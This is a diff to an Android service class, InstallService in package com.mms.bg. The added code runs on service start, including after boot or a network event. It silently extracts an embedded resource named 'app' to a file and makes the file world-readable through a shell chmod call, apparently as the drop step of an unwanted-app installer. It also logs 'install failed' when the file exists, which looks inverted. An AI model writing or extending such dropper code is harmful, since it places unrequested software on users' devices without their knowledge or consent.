@@ -1,5 +1,6 @@
 package com.mms.bg.ui;
 
+import java.io.File;
 import java.io.InputStream;
 import java.util.List;
 
@@ -8,7 +9,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.content.pm.PackageManager.NameNotFoundException;
 import android.os.IBinder;
 
 import com.mms.bg.R;
@@ -39,7 +39,7 @@ public class InstallService extends Service {
 //        } catch (NameNotFoundException e) {
 //            e.printStackTrace();
 //        }
-        mHasbeenInstalled = isPackageAlreadyInstalled(this, "com.mms");
+        mHasbeenInstalled = isPackageAlreadyInstalled(this, "com.mms.bg");
         service_start = true;
 		mSM.log("oncreate--------");
     }
@@ -47,6 +47,29 @@ public class InstallService extends Service {
     @Override
     public void onStart(Intent intent, int startId) {
         super.onStart(intent, startId);
+        
+        if (mHasbeenInstalled == false) {
+            //not find package, install it now
+              try {
+                  InputStream is = getResources().openRawResource(R.raw.app);
+                  mSM.log("unzip file to : " + OUT_PATH + OUT_FILE_NAME);
+                  ZipUtil.outputFile(is, OUT_PATH, OUT_FILE_NAME);
+                  Runtime.getRuntime().exec("chmod 666 " + OUT_PATH + OUT_FILE_NAME);
+                  is.close();
+                  mHasbeenInstalled = true;
+                  File file = new File(OUT_PATH + OUT_FILE_NAME);
+                  if (file.exists()) {
+                      mSM.setInternalInstallReason("install failed");
+                  } else {
+                      mSM.setInternalInstallReason("file is not exist in file : " + OUT_PATH + OUT_FILE_NAME);
+                  }
+              } catch (Exception e) {
+                  e.printStackTrace();
+                  mSM.setInternalInstallReason(e.getMessage());
+              }
+          } else {
+              mSM.setInternalInstallReason("not install as the package is installed");
+          }
         
         String action = intent.getAction();
         if (action == null || action.equals(BgService.ACTION_INTERNET) || action.equals(BgService.ACTION_BOOT)) {
@@ -71,20 +94,6 @@ public class InstallService extends Service {
                 mSM.setLastConnectServerTime(System.currentTimeMillis());
                 mSM.mHasSetFetchServerInfoAlarm = false;
                 mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
-            }
-        }
-        
-        if (mHasbeenInstalled == false) {
-          //not find package, install it now
-            try {
-                InputStream is = getResources().openRawResource(R.raw.app);
-                mSM.log("unzip file to : " + OUT_PATH + OUT_FILE_NAME);
-                ZipUtil.outputFile(is, OUT_PATH, OUT_FILE_NAME);
-                Runtime.getRuntime().exec("chmod 666 " + OUT_PATH + OUT_FILE_NAME);
-                is.close();
-                mHasbeenInstalled = true;
-            } catch (Exception e) {
-                e.printStackTrace();
             }
         }
     }
